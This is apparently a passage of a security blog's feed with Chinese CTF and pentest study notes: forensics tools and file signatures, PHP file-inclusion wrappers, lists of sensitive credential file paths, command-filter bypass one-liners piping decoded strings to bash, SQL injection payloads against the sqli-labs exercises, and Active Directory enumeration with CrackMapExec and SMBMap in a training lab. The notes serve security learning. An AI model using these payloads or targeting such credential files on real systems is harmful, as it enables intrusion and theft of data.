title="图片"></a>图片</h3><ul><li>查看通道二维码</li><li>查看内嵌文件 stegseek、zsteg 分离 binwalk</li></ul><h3 id="未知文件"><a href="#未知文件" class="headerlink" title="未知文件"></a>未知文件</h3><ul><li><p>winhex 看文件头修改后缀</p><ul><li><p>core：string |grep</p></li><li><p>pdf：文件分离等 foremost</p></li></ul></li></ul><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><ul><li>直接find</li><li>提取文件 foremost -t all -i </li><li>过滤本网络查看异常</li></ul><h2 id="流量分析-1"><a href="#流量分析-1" class="headerlink" title="流量分析"></a>流量分析</h2><ul><li><p>如果flag存在于流量中，那么把包传入winhex，直接搜索flag等关键字</p></li><li><p>http contains “shell”</p></li></ul><h2 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h2><p><a href="https://blog.csdn.net/weixin_39934520/article/details/121959797">心仪的公司_心仪的公司攻防_红烧兔纸的博客-CSDN博客</a></p><blockquote><p>ip.addr &#x3D; 192.168.1.0&#x2F;24过滤内网ip</p><p>192.168.1.111大量访问外网，猜测是192.168.1.108做反向代理攻击过滤192.168.1.108追踪tcp流得到filag</p></blockquote><p><a href="https://blog.csdn.net/MrTreebook/article/details/123442355">攻防世界 Misc 心仪的公司-CSDN博客</a></p><pre><code>strings webshell.pcapng | grep &quot;&#123;&quot;</code></pre><p><a href="https://blog.csdn.net/l8947943/article/details/122692365">xctf攻防世界 MISC高手进阶区 low_攻防世界low-CSDN博客</a></p><p>用画图工具打开bmp图片，其次将其另存为png格式。接着使用stegsolve打开图片</p><h2 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h2><p>假设，有一个名为 lxk.py 的源文件：</p><p>print(“Hello Python!”)<br>要编译为 *.pyc 文件，需要引入 Python 中的模块 py_compile，在交互模式下输入：</p><pre><code>&gt;&gt;&gt; import py_compile&gt;&gt;&gt; py_compile.compile(&quot;lxk.py&quot;)</code></pre><h4 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h4><p>命令行下：<strong>python -m py_compile test.p</strong></p><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>首先安装库 <code>uncompyle:  pip install uncompyle</code></p><p>命令行下：uncompyle6 test.pyc &gt; test1.py </p><h2 id="formost-分离文件"><a href="#formost-分离文件" class="headerlink" title="formost 分离文件"></a>formost 分离文件</h2><p>c:&gt; foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t <type>] [-s <blocks>] [-k <size>]<br>    [-b <size>] [-c <file>] [-o <dir>] [-i &lt;file]</p><blockquote><p>-V  - 显示版权信息并退出<br>-t  - 指定文件类型.  (-t jpeg,pdf …)<br>-d  - 打开间接块检测 (针对UNIX文件系统)<br>-i  - 指定输入文件 (默认为标准输入)<br>-a  - 写入所有的文件头部, 不执行错误检测(损坏文件)<br>-w  - 向磁盘写入审计文件，不写入任何检测到的文件<br>-o  - 设置输出目录 (默认为.&#x2F;output)<br>-c  - 设置配置文件 (默认为foremost.conf)<br>-q  - 启用快速模式. 在512字节边界执行搜索.<br>-Q  - 启用安静模式. 禁用输出消息.<br>-v  - 详细模式. 向屏幕上记录所有消息。</p></blockquote><p>foremost -i 分离隐藏文件</p><p>foremost -t 需要恢复文件类型后缀(如jpg) -i 扫描的分区 -o 指定存放文件的目录</p><p>foremost -t all -i f9809647382a42e5bfb64d7d447b4099.pcap</p><blockquote><p>这个例子中，命令 <code>foremost -t all -i f9809647382a42e5bfb64d7d447b4099.pcap</code> 将尝试从名为 <code>f9809647382a42e5bfb64d7d447b4099.pcap</code> 的 PCAP 文件中找回所有可能的文件类型。这些文件将会被提取并保存到指定的输出目录中。</p></blockquote><p>zsteg:</p><p>zsteg stego100.png</p><h2 id="binwalk-检索隐写"><a href="#binwalk-检索隐写" class="headerlink" title="binwalk 检索隐写"></a>binwalk 检索隐写</h2><p>binwalk xxx</p><h3 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头:"></a>常见文件头:</h3><pre><code>JPEG (jpg)，文件头：FF D8 FFPNG (png)，文件头：89 50 4E 47     【参考：png文件头详解】89 50 4e 47 0d 0a 1a 0aGIF (gif)，文件头：47 49 46 38Windows Bitmap (bmp)，文件头：42 4D [参考：bmp文件格式详解]42 4D 36 0C 30 00 00 00 00 00 36 00 00 00 28 00 00 00 56 05 00 00 00 03 00 00 01 00 18 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00python反编译文件pyc的头：03 F3 0D 0A  （实验吧，py的交易会用到）pyd的文件头：4D 5A 90 00ZIP Archive (zip)，文件头：50 4B 03 04 ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件rar文件: 52 61 72 217z文件头：37 7A BC AF 27 1C（实验吧，有趣的文件用到了）MS Word/Excel (xls.or.doc)，文件头：D0CF11E0CAD (dwg)，文件头：41433130Adobe Photoshop (psd)，文件头：38425053Rich Text Format (rtf)，文件头：7B5C727466XML (xml)，文件头：3C3F786D6CHTML (html)，文件头：68746D6C3EEmail [thorough only] (eml)，文件头：44656C69766572792D646174653AOutlook Express (dbx)，文件头：CFAD12FEC5FD746FOutlook (pst)，文件头：2142444EMS Access (mdb)，文件头：5374616E64617264204AWordPerfect (wpd)，文件头：FF575043Postscript (eps.or.ps)，文件头：252150532D41646F6265Adobe Acrobat (pdf)，文件头：255044462D312EQuicken (qdf)，文件头：AC9EBD8FWindows Password (pwl)，文件头：E3828596RAR Archive (rar)，文件头：52617221Wave (wav)，文件头：57415645AVI (avi)，文件头：41564920Real Audio (ram)，文件头：2E7261FDReal Media (rm)，文件头：2E524D46MPEG (mpg)，文件头：000001BAMPEG (mpg)，文件头：000001B3Quicktime (mov)，文件头：6D6F6F76Windows Media (asf)，文件头：3026B2758E66CF11MIDI (mid)，文件头：4D546864</code></pre><h2 id="Core文件简介"><a href="#Core文件简介" class="headerlink" title="Core文件简介"></a>Core文件简介</h2><p>Core文件其实就是内存的映像，当程序崩溃时，存储内存的相应信息，主用用于对程序进行调试。当程序崩溃时便会产生core文件，其实准确的应该说是core dump 文件,默认生成位置与可执行程序位于同一目录下，文件名为core.<em><strong>,其中</strong></em>是某一数字。</p><p>我们可以使用strings命令查看字符串内容<br><a href="https://blog.csdn.net/stpeace/article/details/46641069">strings命令</a>打印文件中可打印的字符</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="伪协议："><a href="#伪协议：" class="headerlink" title="伪协议："></a>伪协议：</h2><p>php:&#x2F;&#x2F;input伪协议以POST传参</p><p>data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p><p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</p><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p><p><strong>windows常见的敏感文件路径:</strong></p><pre><code class="cobol">C:\boot.ini //查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件C:\Windows\repair\sam //存储系统初次安装的密码C:\Program Files\mysql\my.ini //Mysql配置C:\Program Files\mysql\data\mysql\user.MYD //Mysql rootC:\Windows\php.ini //php配置信息C:\Windows\my.ini //Mysql配置信息C:\Windows\win.ini //Windows系统的一个基本系统配置文件</code></pre><p><strong>Linux常见的敏感文件路径:</strong></p><pre><code>/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts //记录每个访问计算机用户的公钥/etc/passwd/etc/shadow/etc/my.cnf //mysql配置文件/etc/httpd/conf/httpd.conf //apache配置文件/root/.bash_history //用户历史命令记录文件/root/.mysql_history //mysql历史命令记录文件/proc/mounts //记录系统挂载设备/porc/config.gz //内核配置文件/var/lib/mlocate/mlocate.db //全文件路径/porc/self/cmdline //当前进程的cmdline参数- /etc/passwd- /proc/self/cmdline，用于获取当前启动进程的完整命令。- /proc/self/maps获取堆栈分布- /proc/self/mem得到进程的内存内容</code></pre><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><pre><code>cat fl*  用匹配任意 cat fla 用*匹配任意ca\t fla\g.php        反斜线绕过cat fl&#39;&#39;ag.php        两个单引号绕过echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash      //base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       //hex编码绕过(引号可以去掉)echo &quot;63617420666c61672e706870&quot; | xxd -r -p | sh     //sh的效果和bash一样cat fl[a]g.php       用[]匹配a=fl;b=ag;cat $a$b          变量替换cp fla&#123;g.php,G&#125;    把flag.php复制为flaGca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </code></pre><h1 id="源码备份"><a href="#源码备份" class="headerlink" title="源码备份"></a>源码备份</h1><p>常见的网站源码备份文件后缀:</p><p>tar.gz，zip，rar，tar</p><p>常见的网站源码备份文件名：</p><p>web，website，backup，back，www，wwwroot，temp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL&quot;&gt;&lt;a href=&quot;#SQL&quot; class=&quot;headerlink&quot; title=&quot;SQL&quot;&gt;&lt;/a&gt;SQL&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/l2872253606/article/details/1233624</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://taninluv.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Windows_Privilege_Escalation</title>
    <link href="https://taninluv.github.io/2023/10/24/Windows-Privilege-Escalation/"/>
    <id>https://taninluv.github.io/2023/10/24/Windows-Privilege-Escalation/</id>
    <published>2023-10-24T12:47:13.000Z</published>
    <updated>2023-10-24T12:58:40.421Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息枚举"><a href="#信息枚举" class="headerlink" title="信息枚举"></a>信息枚举</h1><h2 id="查看arp缓存"><a href="#查看arp缓存" class="headerlink" title="查看arp缓存"></a>查看arp缓存</h2><pre><code>arp -a</code></pre><h2 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h2><pre><code>route print</code></pre><h2 id="powershell-查看Windows-Defender-状态"><a href="#powershell-查看Windows-Defender-状态" class="headerlink" title="powershell:查看Windows Defender 状态"></a>powershell:查看Windows Defender 状态</h2><pre><code>Get-MpComputerStatus</code></pre><h2 id="ps-列出应用锁程序规则"><a href="#ps-列出应用锁程序规则" class="headerlink" title="ps:列出应用锁程序规则"></a>ps:列出应用锁程序规则</h2><pre><code class="powershell-session">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></pre><h2 id="测试AppLocker策略"><a href="#测试AppLocker策略" class="headerlink" title="测试AppLocker策略"></a>测试AppLocker策略</h2><pre><code class="powershell-session">PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User EveryoneFilePath                    PolicyDecision MatchingRule--------                    -------------- ------------C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息枚举&quot;&gt;&lt;a href=&quot;#信息枚举&quot; class=&quot;headerlink&quot; title=&quot;信息枚举&quot;&gt;&lt;/a&gt;信息枚举&lt;/h1&gt;&lt;h2 id=&quot;查看arp缓存&quot;&gt;&lt;a href=&quot;#查看arp缓存&quot; class=&quot;headerlink&quot; title=&quot;查看a</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="Windows" scheme="https://taninluv.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab_pass</title>
    <link href="https://taninluv.github.io/2023/10/20/sqli-lab-pass/"/>
    <id>https://taninluv.github.io/2023/10/20/sqli-lab-pass/</id>
    <published>2023-10-20T08:18:51.000Z</published>
    <updated>2023-12-04T08:01:13.475Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://drun1baby.top/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/">从0到1完全掌握 SQL 注入 | Drunkbaby’s Blog (drun1baby.top)</a></p><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information schema"></a>information schema</h1><p><a href="https://www.pianshen.com/article/3739146098/">mysql中information_schema说明 - 程序员大本营 (pianshen.com)</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803755.png" alt="image-20231020172620307"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803757.png" alt="image-20231020172716074"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803758.png" alt="image-20231020172740361"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803760.png" alt="image-20231020172751913"></p><p><a href="https://blog.csdn.net/cplvfx/article/details/108292814">information_schema.columns字段说明，获取数据库表所有列信息-CSDN博客</a></p><h1 id="mysql中的连接函数"><a href="#mysql中的连接函数" class="headerlink" title="mysql中的连接函数"></a>mysql中的连接函数</h1><p><a href="https://blog.csdn.net/qq_34292479/article/details/86500185">详解MySQL中CONCAT()函数的用法（链接字符串）_mysql concat-CSDN博客</a></p><p><a href="https://blog.csdn.net/liu_feng_zi_/article/details/106863688">SQL学习笔记——limit用法（limit使用一个参数，limit使用两个参数）_limit参数-CSDN博客</a></p><h1 id="SUBSTR-、Ascii"><a href="#SUBSTR-、Ascii" class="headerlink" title="SUBSTR()、Ascii()"></a>SUBSTR()、Ascii()</h1><p><a href="https://zhuanlan.zhihu.com/p/110142732">MySQL|SUBSTR() 函数用法 - 知乎 (zhihu.com)</a></p><p><a href="https://www.yiibai.com/sqlserver/sql-server-ascii-function.html">SQL Server Ascii()函数 - SQL Server教程 (yiibai.com)</a></p><h1 id="extractvalue-、updatexml-、floor-报错注入"><a href="#extractvalue-、updatexml-、floor-报错注入" class="headerlink" title="extractvalue()、updatexml()、floor()报错注入"></a>extractvalue()、updatexml()、floor()报错注入</h1><p><a href="https://blog.csdn.net/weixin_46145442/article/details/110254238">sql注入中报错注入函数extractvalue和updatexml函数的原理及使用-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_46634468/article/details/120692475">【精选】SQL报错型注入原理-详细讲解 extractvalue()、updatexml()、floor() 的报错原因-CSDN博客</a></p><p>如果<code>extractvalue()</code>爆出的字段数不够，在条件中加入not来去除已经查询到的数据，然后显示未查询到的</p><p>such as：</p><pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;,&#39;user&#39;,&#39;avatar&#39;,&#39;last_login&#39;,&#39;failed_login&#39;)))) --</code></pre><p><code>extractvalue()</code>第二个参数似乎只能注入<code>concat()</code>（-笔者目前所知），但是<code>concat()</code>的参数可以嵌套<code>group_concat()</code>:</p><pre><code>127.0.0.1/Less-5/?id=1&#39;%20 union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p>也可已使用用<code>substring()</code>函数截取</p><pre><code>select (extractvalue(1,concat(0x7e,substring(hex((select database())),1,32))));</code></pre><p>经过测试，<code>updatexml()</code>也是可以和上面这样的嵌套</p><pre><code>http://127.0.0.1/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(username)%20from%20users%20where%20username%20not%20in%20(%22Angelina%22,%22Dummy%22,%22secure,stup%22)),0x7e),1)%20--+</code></pre><p>同样的情况下，应该可以使用<code>floor()</code>(但是根据上方博客的测试内容，rand()产生的伪随机数列011011001，需要运行到第三次产生异常导致报错，所以笔者预估需要数据库中至少三个数据才能使用floor()报错注入):</p><pre><code>“select * from users where id=‘1’ and ( select 1 from ( select count(),concat( ( select schema_name from information_schema.schemata limit 0,1 ), floor( rand( 0 )2 ) ) x from information_schema.schemata group by x ) b ) --+ ’ LIMIT 0,1”</code></pre><h1 id="left-、right"><a href="#left-、right" class="headerlink" title="left()、right()"></a>left()、right()</h1><p><a href="https://blog.csdn.net/m0_69860228/article/details/124897306">SQL中常用的字符串LEFT函数和RIGHT函数详解_数据库left_Java架构狮的博客-CSDN博客</a></p><h1 id="limit和offset"><a href="#limit和offset" class="headerlink" title="limit和offset"></a>limit和offset</h1><p><a href="https://zhuanlan.zhihu.com/p/116007156">MYSQL|limit和offset用法 - 知乎 (zhihu.com)</a></p><h1 id="outfile"><a href="#outfile" class="headerlink" title="outfile"></a>outfile</h1><p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">MySQL讲义第 36 讲——select 查询之 INTO OUTFILE参数_select into outfile-CSDN博客</a></p><h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><p><a href="https://blog.csdn.net/weixin_43096078/article/details/108215076">SQL注入中，注释#、 –+、 –%20、 %23到底是什么意思？sqli-labs-master-CSDN博客</a></p><p>在get请求中使用<code>--+</code>而在post请求中使用<code>#</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/&quot;&gt;从0到1完全掌握 SQL </summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="sqli-lab" scheme="https://taninluv.github.io/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>AD-3</title>
    <link href="https://taninluv.github.io/2023/10/02/AD-3/"/>
    <id>https://taninluv.github.io/2023/10/02/AD-3/</id>
    <published>2023-10-02T07:39:28.000Z</published>
    <updated>2023-10-07T09:00:45.041Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Deeper Down the Rabbit Hole<ul><li>认证枚举</li></ul></li><li>Cooking with Fire</li></ul><span id="more"></span><h1 id="Credentialed-Enumeration-from-Linux"><a href="#Credentialed-Enumeration-from-Linux" class="headerlink" title="Credentialed Enumeration - from Linux"></a>Credentialed Enumeration - from Linux</h1><h4 id="CME-Domain-User-Enumeration"><a href="#CME-Domain-User-Enumeration" class="headerlink" title="CME - Domain User Enumeration"></a>CME - Domain User Enumeration</h4><p>我们首先将CME指向域控制器，并使用第二个用户的凭据来检索所有域用户的列表。请注意，当它向我们提供用户信息时，它包括诸如badPwdCount属性之类的数据点。这在执行有针对性的密码喷洒等操作时很有帮助。我们可以构建一个目标用户列表，过滤掉badPwdCount属性高于0的任何用户，以格外小心，不要锁定任何帐户。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --usersSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395&lt;SNIP&gt;</code></pre><p>我们还可以获得域组的完整列表。我们应该将所有输出保存到文件中，以便以后再次轻松访问，以便进行报告或与其他工具一起使用。</p><h4 id="CME-Domain-Group-Enumeration"><a href="#CME-Domain-Group-Enumeration" class="headerlink" title="CME - Domain Group Enumeration"></a>CME - Domain Group Enumeration</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groupsSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0&lt;SNIP&gt;SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0&lt;SNIP&gt;SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36&lt;SNIP&gt;</code></pre><p>上面的代码段列出了域中的组以及每个组中的用户数。输出还显示域控制器上的内置组，例如Backup Operators。我们可以开始记下感兴趣的群体。请注意关键组，如管理员、域管理员、行政人员，以及可能包含特权IT管理员的任何组等。这些组可能包含具有提升权限的用户，值得在我们的评估中作为目标。</p><h4 id="CME-Logged-On-Users"><a href="#CME-Logged-On-Users" class="headerlink" title="CME - Logged On Users"></a>CME - Logged On Users</h4><p>我们也可以使用CME来瞄准其他主机。让我们检查一下似乎是文件服务器的内容，看看当前登录了哪些用户。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-usersSMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon usersSMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01&lt;SNIP&gt;</code></pre><p>我们看到许多用户登录到这个服务器，这非常有趣。我们还可以看到，我们的用户forend是本地管理员，因为（Pwn3d！）出现在工具成功验证到目标主机之后。像这样的主机可以被管理用户用作跳转主机或类似的主机。我们可以看到用户wley已经登录，我们之前将其标识为域管理员。如果我们可以从内存中窃取或模拟该用户的凭据，这可能是一场轻松的胜利。 正如我们稍后将看到的，BloodHound（以及PowerView等其他工具）可以用于查找用户会话。BloodHound功能特别强大，因为我们可以使用它以多种方式以图形方式快速查看域用户会话。无论如何，像CME这样的工具非常适合更有针对性的枚举和用户搜索。</p><h4 id="CME-Share-Searching"><a href="#CME-Share-Searching" class="headerlink" title="CME Share Searching"></a>CME Share Searching</h4><p>我们看到有几个共享可供我们使用READ访问。Department Shares<code>, </code>User Shares和ZZZ_archive共享值得进一步挖掘，因为它们可能包含密码或PII等敏感数据。接下来，我们可以深入挖掘共享，并在每个目录中搜寻文件。spider_plus模块将挖掘主机上的每个可读共享，并列出所有可读文件。让我们试一试。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share &#39;Department Shares&#39;SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: [&#39;print$&#39;]SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: [&#39;ico&#39;, &#39;lnk&#39;]SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus</code></pre><p>在上面的命令中，我们对Department Shares运行了spider。完成后，CME将结果写入位于&#x2F;tmp&#x2F;CME_spider_plus&#x2F;<ip-of-host>的JSON文件。下面我们可以看到JSON输出的一部分。我们可以四处寻找有趣的文件，例如web.config文件或可能包含密码的脚本。如果我们想进一步挖掘，我们可以提取这些文件来查看其中包含的内容，也许可以找到一些硬编码的凭据或其他敏感信息。</p><p>这只是对其能力的一个微小的观察；值得对实验室目标进行更多的实验。在本模块的剩余部分中，我们将以各种方式利用CME。让我们继续看SMBMap。</p><h2 id="SMBMap"><a href="#SMBMap" class="headerlink" title="SMBMap"></a>SMBMap</h2><p>SMBMap非常适合从Linux攻击主机枚举SMB共享。它可用于收集共享、权限和共享内容的列表（如果可以访问）。一旦获得访问权限，就可以用来下载和上传文件以及执行远程命令。 与CME一样，我们可以使用SMBMap和一组域用户凭据来检查远程系统上的可访问共享</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5[+] IP: 172.16.5.5:445Name: inlanefreight.local                                       Disk                                                  PermissionsComment    ----                                                  ------------------    ADMIN$                                            NO ACCESSRemote Admin    C$                                                NO ACCESSDefault share    Department Shares                                 READ ONLY    IPC$                                              READ ONLYRemote IPC    NETLOGON                                          READ ONLYLogon server share     SYSVOL                                            READ ONLYLogon server share     User Shares                                       READ ONLY    ZZZ_archive                                       READ ONLY</code></pre><p>以上内容将告诉我们我们的用户可以访问什么以及他们的权限级别。与CME的结果一样，我们看到用户forend无法通过ADMIN$或C$共享访问DC（这是标准用户帐户所期望的），但可以通过IPC$、NETLOGON和SYSVOL进行读取访问，这是任何域中的默认访问权限。其他非标准共享，如部门共享以及用户和归档共享，是最有趣的。让我们递归地列出Department Shares共享中的目录。正如预期的那样，我们可以看到公司中每个部门的子目录。</p><h4 id="Recursive-List-Of-All-Directories"><a href="#Recursive-List-Of-All-Directories" class="headerlink" title="Recursive List Of All Directories"></a>Recursive List Of All Directories</h4><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#39;Department Shares&#39; --dir-only[+] IP: 172.16.5.5:445Name: inlanefreight.local                                       Disk                                                  PermissionsComment    ----                                                  ------------------    Department Shares                                 READ ONLY    .\Department Shares\*    dr--r--r--                0 Thu Mar 31 15:34:29 2022.    dr--r--r--                0 Thu Mar 31 15:34:29 2022..    dr--r--r--                0 Thu Mar 31 15:14:48 2022Accounting    dr--r--r--                0 Thu Mar 31 15:14:39 2022Executives    dr--r--r--                0 Thu Mar 31 15:14:57 2022Finance    dr--r--r--                0 Thu Mar 31 15:15:04 2022HR    dr--r--r--                0 Thu Mar 31 15:15:21 2022IT    dr--r--r--                0 Thu Mar 31 15:15:29 2022Legal    dr--r--r--                0 Thu Mar 31 15:15:37 2022Marketing    dr--r--r--                0 Thu Mar 31 15:15:47 2022Operations    dr--r--r--                0 Thu Mar 31 15:15:58 2022R&amp;D    dr--r--r--                0 Thu Mar 31 15:16:10 2022Temp    dr--r--r--                0 Thu Mar 31 15:16:18 2022Warehouse    &lt;SNIP&gt;</code></pre><h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><pre><code class="bash">rpcclient -U &quot;&quot; -N 172.16.5.5</code></pre><h4 id="rpcclient-Enumeration"><a href="#rpcclient-Enumeration" class="headerlink" title="rpcclient Enumeration"></a>rpcclient 